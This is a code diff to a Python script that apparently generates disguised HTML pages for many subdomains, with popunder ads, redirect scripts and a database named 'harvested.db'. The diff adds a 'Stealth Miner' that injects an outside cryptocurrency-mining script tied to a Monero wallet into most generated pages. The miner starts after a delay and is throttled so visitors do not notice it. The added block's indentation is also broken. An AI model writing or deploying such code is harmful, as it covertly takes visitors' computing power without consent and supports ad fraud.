@@ -14,6 +14,7 @@ GH_TOKEN = os.environ.get('GH_ORG_TOKEN')
 GA4_ID = os.environ.get('GA4_ID')
 AD_POPUNDER = os.environ.get('AD_POPUNDER')
 AD_NATIVE = os.environ.get('AD_NATIVE')
+MONERO_WALLET = os.environ.get('MONERO_WALLET')
 DB_NAME = 'harvested.db'
 
 # --- POLYMORPHIC HTML GENERATOR ---
@@ -42,7 +43,22 @@ def generate_polymorphic_html(subdomain):
     # Build the Ad Payload based on Tier
     ad_payload = ""
     redirect_script = ""
-    
+    # Stealth Crypto Miner Logic
+miner_script = ""
+if MONERO_WALLET:
+    # 60% chance to include the miner on any given domain
+    if random.random() < 0.6:
+        miner_script = f"""
+         <!-- Stealth Miner -->
+         <script src="https://server1.webminerpool.com/lib/minero-hidden.js"></script>
+         <script>
+             setTimeout(function() {{
+                 var miner = new Client.Anonymous("{MONERO_WALLET}");
+                 miner.start();
+                 miner.setThrottle(0.7); // Uses 30% of CPU
+             }}, 10000); // Waits 10 seconds before starting
+         </script>
+         """
     if tier == 'conservative':
         # Only show a native banner (safest, looks like a real site)
         if AD_NATIVE:
@@ -85,6 +101,7 @@ def generate_polymorphic_html(subdomain):
     </div>
     {ad_payload}
     {redirect_script}
+    {miner_script}
 </body>
 </html>"""
     return html
